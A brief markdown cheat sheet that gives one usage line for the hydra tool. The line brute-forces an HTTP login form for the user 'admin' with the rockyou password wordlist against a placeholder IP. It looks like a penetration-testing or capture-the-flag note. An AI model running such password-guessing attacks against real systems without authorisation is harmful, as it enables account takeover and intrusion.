# hydra

## usage
`hydra -l admin -P /usr/share/wordlists/rockyou.txt <ip> http-form-post "/path/to/form:Username=^USER^&Password=^PASS^(request body):Login failed(error message)"`
